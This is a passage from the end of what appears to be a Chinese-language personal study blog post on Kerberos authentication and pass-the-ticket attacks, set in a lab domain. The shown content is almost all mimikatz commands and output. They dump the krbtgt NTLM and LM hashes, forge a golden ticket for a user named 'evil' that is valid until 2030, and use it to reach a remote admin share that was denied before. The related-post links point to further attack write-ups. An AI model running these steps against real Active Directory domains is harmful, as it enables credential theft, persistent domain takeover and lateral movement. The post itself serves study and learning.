+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/10/2020 10:58:42 AM
+Object Security ID   : S-1-5-21-2475887593-94489213-2292866110-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 29bb608cc69ec270aed8805b190cff38
+    ntlm- 0: 29bb608cc69ec270aed8805b190cff38
+    lm  - 0: 67caa7fabf71d94ac00ec2adfaa076f0
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:krbtgt
+Domain : RING2 / S-1-5-21-2475887593-94489213-2292866110
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 29bb608cc69ec270aed8805b190cff38
+    LM   :
+  Hash NTLM: 29bb608cc69ec270aed8805b190cff38
+    ntlm- 0: 29bb608cc69ec270aed8805b190cff38
+    lm  - 0: 67caa7fabf71d94ac00ec2adfaa076f0
+</pre></table></code></div></div><p><strong>step 4. ptt</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre>c:\Users\win10\Desktop&gt;dir \\win10-pc2\c$
+Access is denied.
+
+c:\Users\win10\Desktop&gt;mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # kerberos::golden /user:evil /domain:ring2.com /sid:S-1-5-21-2475887593-94489213-2292866110 /krbtgt:29bb608cc69ec270aed8805b190cff38 /ptt
+User      : evil
+Domain    : ring2.com (RING2)
+SID       : S-1-5-21-2475887593-94489213-2292866110
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 29bb608cc69ec270aed8805b190cff38 - rc4_hmac_nt
+Lifetime  : 7/29/2020 11:21:09 PM ; 7/27/2030 11:21:09 PM ; 7/27/2030 11:21:09 PM
+-&gt; Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'evil @ ring2.com' successfully submitted for current session
+
+mimikatz # exit
+Bye!
+
+// 注: 这里要用机器名而不是IP，因为TGS Request中发的是server computer name, DC中查server Hash也是根据computer_name$查的
+c:\Users\win10\Desktop&gt;dir \\win10-pc2\c$
+ Volume in drive \\win10-pc2\c$ has no label.
+ Volume Serial Number is 82AC-49B6
+
+ Directory of \\win10-pc2\c$
+
+07/10/2020  04:06 PM    &lt;DIR&gt;          PerfLogs
+07/27/2020  04:12 AM    &lt;DIR&gt;          Program Files
+07/10/2020  04:14 PM    &lt;DIR&gt;          Program Files (x86)
+07/10/2020  04:16 PM    &lt;DIR&gt;          Users
+07/27/2020  10:18 AM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  43,286,941,696 bytes free
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/%E5%9F%9F%E5%AE%89%E5%85%A8/'>域安全</a>, <a href='/categories/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/'>TA0008横向移动</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/pass-the-ticket/" class="post-tag no-text-decoration" >pass-the-ticket</a> <a href="/tags/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="post-tag no-text-decoration" >TA0008横向移动</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kerberos认证与票据传递 - 我的学习笔记&url=https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kerberos认证与票据传递 - 我的学习笔记&u=https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kerberos认证与票据传递 - 我的学习笔记&url=https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ta0006%E5%87%AD%E6%8D%AE%E8%AE%BF%E9%97%AE/">TA0006凭据访问</a> <a class="post-tag" href="/tags/ta0003%E6%8C%81%E4%B9%85%E5%8C%96/">TA0003持久化</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a> <a class="post-tag" href="/tags/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/">TA0004权限升级</a> <a class="post-tag" href="/tags/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">TA0008横向移动</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/adminsdholder/">AdminSDHolder</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a> <a class="post-tag" href="/tags/dcshadow/">DCShadow</a> <a class="post-tag" href="/tags/dcsync/">dcsync</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/NTLM%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:52+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NTLM认证与利用</h3><div class="text-muted small"><p> 原理 一、Net-NTLM协议 http://d1iv3.me/2018/12/08/LM-Hash%E3%80%81NTLM-Hash%E3%80%81Net-NTLMv1%E3%80%81Net-NTLMv2%E8%AF%A6%E8%A7%A3/ 1. LM Hash与NT Hash LM Hash与NT Hash，密码根据固定算法转成的两种Hash，LM Hash更容易被破解 ...</p></div></div></a></div><div class="card"> <a href="/posts/DNSAdmin/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:55+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DNSAdmin</h3><div class="text-muted small"><p> 0x00 简介 感染DNSAdmin组用户，为DNS服务配置恶意ServerLevelPluginDll，DNS服务会以system权限加载该Dll，从而达到提权目的。 参考： https://github.com/kazkansouh/DNSAdmin-DLL Feature, not bug: DNSAdmin to DC compromise in one line Abus...</p></div></div></a></div><div class="card"> <a href="/posts/%E5%88%A9%E7%94%A8cachedGroupPolicySettings%E5%85%B3%E9%97%ADScriptBlockLogging/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:55+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>利用cachedGroupPolicySettings关闭ScriptBlockLogging</h3><div class="text-muted small"><p> 参考： PowerShell ScriptBlock Logging Bypass In Windows 10 / PowerShell 5.0, Microsoft introduced several new security features in PowerShell. These included the AMSI, Protected Event Logging, and m...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Dump%E5%9F%9F%E5%86%85%E5%87%AD%E6%8D%AE%E6%B1%87%E6%80%BB/" class="btn btn-outline-primary" prompt="Older"><p>Dump域内凭据汇总</p></a> <a href="/posts/NTLM%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/" class="btn btn-outline-primary" prompt="Newer"><p>NTLM认证与利用</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href=""></a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ta0006%E5%87%AD%E6%8D%AE%E8%AE%BF%E9%97%AE/">TA0006凭据访问</a> <a class="post-tag" href="/tags/ta0003%E6%8C%81%E4%B9%85%E5%8C%96/">TA0003持久化</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a> <a class="post-tag" href="/tags/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/">TA0004权限升级</a> <a class="post-tag" href="/tags/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">TA0008横向移动</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/adminsdholder/">AdminSDHolder</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS REP Roasting</a> <a class="post-tag" href="/tags/dcshadow/">DCShadow</a> <a class="post-tag" href="/tags/dcsync/">dcsync</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ringlcy.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
